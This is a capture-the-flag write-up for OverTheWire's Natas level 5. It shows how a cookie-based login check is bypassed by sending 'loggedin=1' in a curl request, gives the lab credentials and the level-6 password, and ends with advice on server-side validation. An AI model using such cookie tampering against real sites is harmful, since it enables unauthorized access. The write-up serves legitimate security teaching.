# 🕵️ Natas - Level 05 (🇺🇸 English)  
*Date:* 2025-05-24  
*Difficulty:* Easy  
*Category:* Web

---

## 🎯 OBJECTIVE

Access `http://natas5.natas.labs.overthewire.org` and retrieve the password to advance to level 6.

---

## 🔎 ANALYSIS

- After logging in with the correct credentials, the site displays the following message:  
  > **Access denied. You are not logged in.**
- The page source contains no useful information, so we checked the HTTP request using the browser’s DevTools.
- In the **Cookies** section, one flag stands out: `loggedin=0`. This indicates the session is **not authenticated**.
- What happens if we change this value?

---

## 🧱 STEPS

1. We noticed the `loggedin` cookie is set to `0`, indicating we're not logged in.
2. We manually changed the value to `1`.
3. Using the terminal, we crafted a request with a modified `Cookie` header:

   ```bash
   curl http://natas5.natas.labs.overthewire.org/ \
     -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \
     -H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0; loggedin=1"
4. After executing the command, we received the following response:
`Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

---

## 🔑 Password Found

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

---

## ✅ Conclusion

This level demonstrates how access control based on cookies can be easily bypassed by manipulating client-side flags.
Security decisions should never rely on user-controlled values like cookies without proper server-side validation.

---

## 🧪 Commands Used

`curl:` Command-line tool for sending HTTP requests   
`-u:` Defines the username and password in the user:password format  
`-H:` Adds a custom header — in this case, a modified Cookie   

---

## 🧠 Observations

Using cookies like `loggedin=1` to control access is extremely insecure.
Any attacker can modify this value using simple tools like curl, browser DevTools, or Burp Suite.
In real applications, authentication and authorization should be handled server-side, using signed tokens or sessions that cannot be forged.

---

<p align="center"> <a href="../Natas04/Readme.md">⬅️ Previous</a> • <a href="../Natas06/Readme.md">Next ➡️</a> </p>
